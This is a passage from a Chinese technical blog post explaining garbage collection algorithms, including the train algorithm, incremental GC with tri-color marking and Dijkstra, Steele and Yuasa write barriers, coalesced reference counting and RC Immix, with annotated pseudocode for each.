alt="image-20210924181640772"></p><p>而当列车一没有其他列车引用其中的对象时，可以将列车一这个列车一并回收。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210930111325106.png" alt="image-20210930111325106"></p><p>【优点】可以减少<code>最大暂停时间</code>，因为每次进行GC的只是一节车厢，只占堆中比较小的一部分。</p><p>【优点】可以回收循环垃圾，毕竟通过列车的记录集就可以知道这个列车是不是孤儿，如果是则将整个列车回收。</p><p>【缺点】因为记录集变多了，所以吞吐量更低了，占用的空间也相应的增加。</p><p>【缺点】如果对象大小大于一个车厢，该算法就不能对他进行处理，需要安排到新生代和老年代以外的堆进行回收。</p><h3 id="增量式垃圾回收（Incremental-GC）"><a href="#增量式垃圾回收（Incremental-GC）" class="headerlink" title="增量式垃圾回收（Incremental GC）"></a>增量式垃圾回收（Incremental GC）</h3><h4 id="定义-6"><a href="#定义-6" class="headerlink" title="定义"></a>定义</h4><p>如果当GC执行的时间过长导致这段时间mutator完全不能工作，那么就将这种GC叫做停止型GC。根据mutator的用途不同，有时候停止型GC是非常要命的。因此我们可以采用慢慢发生变化的方式进行GC，这种方式叫做<code>增量式垃圾回收</code>。停止型GC和增量式垃圾回收图如下。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210926165352020.png" alt="image-20210926165352020"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210926165416813.png" alt="image-20210926165416813"></p><p>描述增量式垃圾回收的算法可以方便的使用三色标记算法（Tri-color marking）。</p><ul><li>白色：还未搜索过的对象</li><li>灰色：正在搜索的对象</li><li>黑色：搜索完成的对象</li></ul><p>以 GC 标记 - 清除算法为例：</p><ol><li><code>根查找阶段</code>：GC 开始运行前所有的对象都是白色。GC 一开始运行，所有从根直接到达的对象都会被放到栈里并被标记为灰色。</li><li><code>标记阶段</code>：灰色对象会被依次从栈中取出，其子对象也会被涂成灰色。当其所有的子对象都被涂成灰色时，对象就会被涂成黑色。</li><li><code>清除阶段</code>：当 GC 结束时已经不存在灰色对象了，活动对象全部为黑色，垃圾则为白色。这时将白色对象全部回收。</li></ol><p>三色标记算法这个概念不仅能应用于 GC标记 - 清除算法，还能应用于其他所有搜索型 GC 算法。这里面有个数据结构存放要遍历标记的对象叫做标记栈，标记栈里面存放的一定是灰色对象，代表里面的对象需要进行处理。而从标记栈中出来的对象则会被涂成黑色，代表处理完毕并且它是个活动对象。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/webp.webp" alt="img"></p><h4 id="实现-5"><a href="#实现-5" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// incremental_gc：增量式垃圾回收。分为三个阶段——根查找阶段、标记阶段、清除阶段。</span></span><br><span class="line"><span class="built_in">incremental_gc</span>()&#123;</span><br><span class="line"> <span class="keyword">case</span> $<span class="function">gc_phase</span></span><br><span class="line"><span class="function"> when GC_ROOT_SCAN</span></span><br><span class="line"><span class="function"> <span class="title">root_scan_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> when GC_MARK</span></span><br><span class="line"><span class="function"> <span class="title">incremental_mark_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> <span class="keyword">else</span></span></span><br><span class="line"><span class="function"> <span class="title">incremental_sweep_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// root_scan_phase：根查找阶段将根直接引用的对象标灰。也就是将其放入标记栈中。</span></span></span><br><span class="line"><span class="function"><span class="title">root_scan_phase</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> <span class="built_in">mark</span>(*r)</span><br><span class="line"> $gc_phase = GC_MARK</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">mark</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.mark == FALSE)</span><br><span class="line"> obj.mark = TRUE</span><br><span class="line"> <span class="built_in">push</span>(obj, $mark_stack)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// incremental_mark_phase：增量标记阶段，此时标记栈中是根直接索引的对象，增量标记阶段则将这些根直接索引的对象继续遍历，将栈中每个元素直接引用的对象标灰并压入标记栈中，然后将该元素自己标为黑色。当然是有次数限制的：为MARK_MAX，要不也不能叫做增量式垃圾回收了，毕竟要一块一块的进行操作。达到为MARK_MAX限制时会暂停标记阶段，之后执行mutator保证进程的暂停时间不至于过长。可以看出这里的搜索方式是部分深度优先搜索，根查找阶段是广搜，增量标记阶段是深搜（因为采取了栈结构，后进入的对象先处理）。</span></span><br><span class="line"><span class="built_in">incremental_mark_phase</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(i : <span class="number">1.</span>.MARK_MAX)</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">is_empty</span>($mark_stack) == FALSE)</span><br><span class="line"> obj = <span class="built_in">pop</span>($mark_stack)</span><br><span class="line">     <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line">         <span class="built_in">mark</span>(*child)</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">         <span class="keyword">for</span>(r : $roots)</span><br><span class="line">            <span class="built_in">mark</span>(*r)</span><br><span class="line"> <span class="keyword">while</span>(<span class="built_in">is_empty</span>($mark_stack) == FALSE)</span><br><span class="line">     obj = <span class="built_in">pop</span>($mark_stack)</span><br><span class="line">     <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line">     <span class="built_in">mark</span>(*child)</span><br><span class="line">     </span><br><span class="line"> $gc_phase = GC_SWEEP</span><br><span class="line"> $sweeping = $heap_start</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// incremental_sweep_phase：增量清除阶段，执行了SWEEP_MAX次，遍历整个堆空间，白色的对象一定为垃圾对象，所以要将其回收。黑色的对象则为活动对象，将其涂成白色方便下一次的标记阶段。</span></span><br><span class="line"><span class="built_in">incremental_sweep_phase</span>()&#123;</span><br><span class="line"> swept_count = <span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span>(swept_count &lt; SWEEP_MAX)</span><br><span class="line"> <span class="keyword">if</span>($sweeping &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>($sweeping.mark == TRUE)</span><br><span class="line"> $sweeping.mark = FALSE</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> $sweeping.next = $free_list</span><br><span class="line"> $free_list = $sweeping</span><br><span class="line"> $free_size += $sweeping.size</span><br><span class="line"> $sweeping += $sweeping.size</span><br><span class="line"> swept_count++</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> $gc_phase = GC_ROOT_SCAN</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// newobj：分配新对象的过程，还是和之前区别不大，这里需要注意的一点就是清除阶段是分段进行的，这样就将堆分为两块空间。分别是已清除完毕的空间和尚未清除完毕的空间，将内存分配在在以清除完毕的空间中不需要做任何事，清除代码也不会处理那块空间，但是如果将内存分配在尚未清除完毕的空间，那么清除程序后续会执行到这里，就需要将这个新分配的对象涂黑。</span></span><br><span class="line"><span class="built_in">newobj</span>(size)&#123;</span><br><span class="line"> <span class="keyword">if</span>($free_size &lt; HEAP_SIZE * GC_THRESHOLD)</span><br><span class="line"> <span class="built_in">incremental_gc</span>()</span><br><span class="line">     </span><br><span class="line"> chunk = <span class="built_in">pickup_chunk</span>(size, $free_list)</span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> chunk.size = size</span><br><span class="line"> $free_size -= size</span><br><span class="line"> <span class="keyword">if</span>($gc_phase == GC_SWEEP &amp;&amp; $sweeping &lt;= chunk)</span><br><span class="line"> chunk.mark = TRUE</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210930115412869.png" alt="image-20210930115412869"></p><h5 id="标记遗漏"><a href="#标记遗漏" class="headerlink" title="标记遗漏"></a>标记遗漏</h5><p>当进程由GC的标记阶段切换到mutator运行时，如果执行了这样一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> C = objB.fieldC;</span><br><span class="line">objA.fieldB = <span class="keyword">null</span>;  </span><br><span class="line">objA.fieldC = C;  </span><br><span class="line">objB.fieldC = <span class="keyword">null</span>;  </span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210930115707655.png" alt="image-20210930115707655"></p><p>此时由B-&gt;C的引用转到了A-&gt;C的引用上。而A已经被涂黑，也就是说他不在标记栈中了，也就不会处理A了。此时如果又从mutator运行状态切换到GC的标记阶段时，本来应该继续通过mark(B)给C打上标记，但是此时C是由A索引的了。C就成孤儿了，如果C本身是个活动对象，那么由于无法对C进行涂色导致可能会释放活动对象的状况，从而导致程序异常。</p><h5 id="写入屏障"><a href="#写入屏障" class="headerlink" title="写入屏障"></a>写入屏障</h5><p>如果新引用的对象 newobj 是白色对象，就把它涂成灰色。(迪杰斯特拉的写入屏障)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write_barrier：这里的mark可能表示灰色或者黑色，区分灰和黑的方式就是它是否在标记栈中，在标记栈中说明它没有被处理也就是灰色，而不在标记栈中说明已经被处理完了所以是黑色。</span></span><br><span class="line"><span class="comment">// 这里的逻辑比较清晰，在(a)-&gt;(b)的过程中判断新空间是否被标记，如果没有标记则将其标记，也就是变为灰色，这里不用担心A和B是白色的问题。因为这里既然可以被程序引用就说明他们肯定是活动对象。</span></span><br><span class="line"><span class="built_in">write_barrier</span>(obj, field, newobj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(newobj.mark == FALSE)</span><br><span class="line"> newobj.mark = TRUE</span><br><span class="line"> <span class="built_in">push</span>(newobj, $mark_stack)</span><br><span class="line"> *field = newobj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210926195627433.png" alt="image-20210926195627433"></p><h4 id="评估-6"><a href="#评估-6" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-6"><a href="#优点-6" class="headerlink" title="优点"></a>优点</h5><p><code>缩短最大暂停时间</code>： GC 与 mutator 交替运行，因此不会长时间妨碍 mutator 运行。</p><h5 id="缺点-6"><a href="#缺点-6" class="headerlink" title="缺点"></a>缺点</h5><p><code>降低了吞吐量</code>：用到了写入屏障，增大了处理的额外负担。</p><h4 id="其他实现方式"><a href="#其他实现方式" class="headerlink" title="其他实现方式"></a>其他实现方式</h4><h5 id="Steele的算法"><a href="#Steele的算法" class="headerlink" title="Steele的算法"></a><strong>Steele</strong>的算法</h5><p>由Steele 1975年开发的算法。这个算法和上面有一点区别，这里obj.mark为True就代表它为黑色，而标记为False则代表它为灰色或者白色。区分灰色和白色的方式和上面相同，就是判断对象是否在标记栈中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mark：与上面mark的区别是灰色的obj.mark值也是FALSE，而上面的obj.mark值为True。</span></span><br><span class="line"><span class="built_in">mark</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.mark == FALSE)</span><br><span class="line"> <span class="built_in">push</span>(obj, $mark_stack)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write_barrier：如果在标记过程中发出引用的对象是黑色对象，且新的引用的目标对象为灰色或白色，那么我们就把发出引用的对象涂成灰色。将A重新压栈这样之后仍然可以通过A来遍历到C。</span></span><br><span class="line"><span class="built_in">write_barrier</span>(obj, field, newobj)&#123;</span><br><span class="line"> <span class="keyword">if</span>($gc_phase == GC_MARK &amp;&amp;</span><br><span class="line"> obj.mark == TRUE &amp;&amp; newobj.mark == FALSE)</span><br><span class="line"> obj.mark = FALSE</span><br><span class="line"> <span class="built_in">push</span>(obj, $mark_stack)</span><br><span class="line"> *field = newobj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210926195555725.png" alt="image-20210926195555725"></p><h5 id="汤浅太一的算法（Snapshot-GC）"><a href="#汤浅太一的算法（Snapshot-GC）" class="headerlink" title="汤浅太一的算法（Snapshot GC）"></a>汤浅太一的算法（Snapshot GC）</h5><p>1990 年汤浅太一开发，也称为“快照 GC”（Snapshot GC）。核心在于它会处理B-&gt;C的指针，即使A-&gt;C黑色对象指向白色对象也没有关系。在B-&gt;C置为null时会触发写屏障， 这时会判断C是否为白色，如果为白色将其涂灰。</p><p>写入屏障实现方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write_barrier：这个写入屏障和刚刚两个不同的地方在于它发生在取消指针的阶段（也就是B-&gt;C的阶段），前两个都是在转移指针的阶段（也就是从A-&gt;C的阶段）</span></span><br><span class="line"><span class="built_in">write_barrier</span>(obj, field, newobj)&#123;</span><br><span class="line"> oldobj = *field</span><br><span class="line"> <span class="keyword">if</span>(gc_phase == GC_MARK &amp;&amp; oldobj.mark == FALSE)</span><br><span class="line"> oldobj.mark = TRUE</span><br><span class="line"> <span class="built_in">push</span>(oldobj, $mark_stack)</span><br><span class="line"> *field = newobj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// newobj：这里和前面的分配对象的实现方式有所不同，前面的分配会判断空间是在已清除完毕的空间还是尚未清除完毕的空间，已清除空间则不同处理，默认为白色，未清除空间则涂黑防止活动对象被清除阶段处理。但是在这里无条件将其涂黑，虽然之后的清楚阶段也有可能将其回收，但是仍然在一段时间内保留了垃圾对象，</span></span><br><span class="line"><span class="built_in">newobj</span>(size)&#123;</span><br><span class="line"> <span class="keyword">if</span>($free_size &lt; HEAP_SIZE * GC_THRESHOLD)</span><br><span class="line"> <span class="built_in">incremental_gc</span>()</span><br><span class="line"> chunk = <span class="built_in">pickup_chunk</span>(size, $free_list)</span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> chunk.size = size</span><br><span class="line"> $free_size -= size</span><br><span class="line"> <span class="keyword">if</span>($gc_phase == GC_MARK)</span><br><span class="line"> chunk.mark = TRUE</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>($gc_phase == GC_SWEEP &amp;&amp; $sweeping &lt;= chunk)</span><br><span class="line"> chunk.mark = TRUE</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210926200451535.png" alt="image-20210926200451535"></p><h4 id="三种方式的比较"><a href="#三种方式的比较" class="headerlink" title="三种方式的比较"></a>三种方式的比较</h4><table><thead><tr><th>提出者</th><th>A</th><th>B</th><th>C</th><th>时机</th><th>动作</th></tr></thead><tbody><tr><td>Dijkstra</td><td>-</td><td>-</td><td>白</td><td>A-&gt;B</td><td>将C涂灰</td></tr><tr><td>Steele</td><td>黑</td><td>-</td><td>白或者黑</td><td>A-&gt;B</td><td>将A恢复成黑色</td></tr><tr><td>汤浅</td><td>-</td><td>白</td><td>-</td><td>B-&gt;C</td><td>将C涂灰</td></tr></tbody></table><p>这样看来，它们 3 个各不相同。实际上不仅是写入屏障，在分配等方面也存在着差异，所以我们没法简单地进行比较。不过即使存在着这么大的差异，各种写入屏障也都能顺畅运行。</p><h3 id="RC-Immix算法"><a href="#RC-Immix算法" class="headerlink" title="RC Immix算法"></a>RC Immix算法</h3><h4 id="定义-7"><a href="#定义-7" class="headerlink" title="定义"></a>定义</h4><p>传统的引用计数法有一大缺点，吞吐量过低。本次介绍的两种方式都会改善其吞吐量到可以实际应用的级别，但是其最大暂停时间可能会有相应的增长，毕竟没有一种算法是完美的。</p><h4 id="合并型引用计数法"><a href="#合并型引用计数法" class="headerlink" title="合并型引用计数法"></a>合并型引用计数法</h4><p>合并型引用计数法是 2001 年由 Yossi Levanoni 和 Erez Petrank 开发的算法。常规的引用计数法步骤可能会造成计数器的频繁修改，造成很大的系统开销，如下所示</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210927110533064.png" alt="image-20210927110533064"></p><p>引用计数法在之前介绍过一个可以提高系统吞吐量的方式，叫做延迟引用计数法。从根引用的指针的变化不反映在计数器上。通过维护一个ZST表，即使频繁重写对象的引用关系也会降低系统开销。</p><p>不过在延迟引用计数法之上还可以进行优化。考虑到图9.1的情况，通过多次变化，(a)-&gt;(b)-&gt;(c)的变化被抵消掉了。如果我们把注意力放在某一时期最初和最后的状态上，在此期间不进行计数器的增减，这样就可以减少很多无效的计算。这种方式就叫做合并型引用计数法。将指针的改动信息注册到更改缓冲区（Modified Buffer）。大致的过程如下图，(e)步骤实际上A的引用计数经过处理后应该变为1，而B则变为2 。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210927111652087.png" alt="image-20210927111652087"></p><p>我们将指针改动了的 X 和指针改动前被 X 引用的 A 注册到了更改缓冲区。结束时X指向了B。之后对B的计数器加一，对A的计数器减一。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// garbage_collect：先进行加法再进行减法的目的是和之前一样，为了确保A和B是同一对象的情况也能顺利运行。</span></span><br><span class="line"><span class="built_in">garbage_collect</span>()&#123;</span><br><span class="line"> foreach(entry : $mod_buf)</span><br><span class="line"> obj = entry.obj</span><br><span class="line"> foreach(child : obj)</span><br><span class="line"> <span class="built_in">inc_ref_cnt</span>(child)</span><br><span class="line"> foreach(child : entry.children)</span><br><span class="line"> <span class="built_in">dec_ref_cnt</span>(child)</span><br><span class="line"> obj.dirty = <span class="literal">false</span></span><br><span class="line"> <span class="built_in">clear</span>($mod_buf)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write_barrier_coalesced_RC：写入屏障的作用就是确保对象进入更改缓冲区（Modified Buffer）</span></span><br><span class="line"><span class="comment">// register：注册函数是将指针改动了的 X 和指针改动前被 X 引用的 A 注册到了更改缓冲区。（X和N同上面的例子）</span></span><br><span class="line"><span class="built_in">write_barrier_coalesced_RC</span>(obj, field, dst)&#123;</span><br><span class="line"> <span class="keyword">if</span>(!obj.dirty)</span><br><span class="line"> <span class="built_in"><span class="keyword">register</span></span>(obj)</span><br><span class="line"> obj.field = dst</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">register</span></span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>($mod_buf.size &lt;= $mod_buf.used_size)</span><br><span class="line"> <span class="built_in">garbage_collect</span>()</span><br><span class="line"> entry.obj = obj</span><br><span class="line"> foreach(child_ptr : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="keyword">if</span>(*child_ptr != null)</span><br><span class="line"> <span class="built_in">push</span>(entry.children, *child_ptr)</span><br><span class="line"> <span class="built_in">push</span>($mod_buf, entry)</span><br><span class="line"> obj.dirty = <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>【优点】增加了吞吐量。它不是逐次进行计数器的增减处理，而是在某种程度上一并执行，所以能无视增量和减量相抵消的部分。</p><p>【缺点】是增加了 mutator 的暂停时间，这是因为在查找更改缓冲区的过程中需要让mutator 暂停。当然，如果更改缓冲区的大小比较小，就能相应缩短暂停时间，不过这种情况下就没法指望增加吞吐量。这方面需要我们加以权衡好好调整。</p><h4 id="RC-Immix（合并型引用计数法和Immix的融合）"><a href="#RC-Immix（合并型引用计数法和Immix的融合）" class="headerlink" title="RC Immix（合并型引用计数法和Immix的融合）"></a>RC Immix（合并型引用计数法和<strong>Immix</strong>的融合）</h4><p>在以往的合并型引用计数法中，通过查找更改缓冲区，计数器值为 0 的对象会被连接到空闲链表，为之后的分配做准备。这和单纯的引用计数法是一样的。</p><p>Immix 中不是以对象为单位，而是以线为单位进行内存管理的，因此不使用空闲链表。如果线内一个活动对象都没有了，就回收整个线。只要线内还有一个活动对象，这个线就无法作为chunk回收。RC Immix 中不仅对象有计数器，线也有计数器，这样就可以获悉线内是否存在活动对象。不过线的计数器和对象的计数器略有不同。对象的计数器表示的是指向这个对象的引用的数量，而线的计数器表示的是这个线里存在的活动对象的数量。如果这个数变成了 0，就要将线整个回收。下图表示的是线的计数器。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210927141739788.png" alt="image-20210927141739788"></p><p>为了减少额外负担，线的计数器里记录的不是“指向线内对象的引用的数量”，而是“线内活动对象的数量”。<strong>对象生成和废弃的频率要低于对象间引用关系变化的频率</strong>，这样一来更新计数器所产生的额外负担就小了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里的线包含了所有活动对象，当某个对象的计数器减为0时，线的计数器减一（因为线包含的是活动对象的数量）；当线的计数器减为0时回收整个线。</span></span><br><span class="line"><span class="comment">// 可能出现这种情况，一个线中只有一个对象，而该对象的引用计数为3。那么线的计数为1&lt;对象的引用计数3。</span></span><br><span class="line"><span class="built_in">dec_ref_cnt</span>(obj)&#123;</span><br><span class="line"> obj.ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="built_in">reclaim_obj</span>(obj)</span><br><span class="line"> line = <span class="built_in">get_line</span>(obj)</span><br><span class="line"> line.ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>(line.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="built_in">reclaim_line</span>(line)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这样处理可能会有内存碎片，RC Immix算法提供了两种方式进行压缩。</p><p><code>被动碎片整理（Reactive  Defragmentation）</code>：RC Immix 和合并型引用计数法一样，在更改缓冲区满了的时候都会查找更改缓冲区，这时如果发现了新对象，就会把它复制到别的空间去。这里使用的是<strong>Cheney</strong>的<strong>GC</strong>复制算法（遍历的方式进行GC复制算法）。简单来说：更改缓冲区里存放的都是新对象（没有经历过 GC 的对象称为新对象，新对象是在上一次 GC 之后生成的。因此指向新对象的所有指针也是在上一次 GC 之后生成的。更改缓冲区里记录的是从上一次 GC 开始到现在为止指针改动过的对象。所有指向新对象的指针都是在上一次 GC 之后生成的。也就是说，所有引用新对象的对象都被注册到了更改缓冲区。），RC Immix 中以新对象为对象进行压缩。不过被动的碎片整理只会对活动对象中的新对象进行压缩。这样随着程序的逐步运行，旧对象可能会导致碎片化。此外，因为我们是以引用计数法为基础的，所以不能回收循环垃圾。为了解决如上问题，在 RC Immix 里还要进行一项压缩，那就是积极的碎片整理。</p><p><code>积极的碎片整理（Proactive Defragmentation）</code>：上面说被动的碎片整理有两个缺点。一是无法对旧对象进行压缩，二是无法回收有循环引用的垃圾。通过GC标记-压缩算法可以有效的解决这个问题。不过这个碎片整理应该被当作辅助碎片整理来用，毕竟这会增大最大暂停时间。当chunk的总大小下降到一定值（例如全体堆的 10%）时再执行它为好。</p><p>【优点】吞吐量提高的比较明显。据论文记载，与以往的引用计数法相比，其吞吐量平均提升了 12%。根据基准测试程序的情况，甚至会超过搜索型 GC。吞吐量得到改善的原因有两个。其一是导入了合并型引用计数法。因为没有通过写入屏障来执行计数器的增减操作，所以即使对象间的引用关系频繁发生变化，吞吐量也不会下降太多。另一个原因是撤除了空闲链表。通过以线为单位来管理chunk，只要在线内移动指针就可以进行分配了。此外，这里还省去了把chunk重新连接到空闲链表的处理。</p><p>【缺点】RC Immix 和合并型引用计数法一样，都会增加暂停时间。不过如前所述，可以通过调整更改缓冲区的大小来缩短暂停时间。另一个缺点是“只要线内还有一个非垃圾对象，就无法将其回收”。在线的计数器是 1，也就是说线内还有一个活动对象的情况下，会白白消耗大部分线。</p><h3 id="总结"><a href="#总结" class="headerlink" 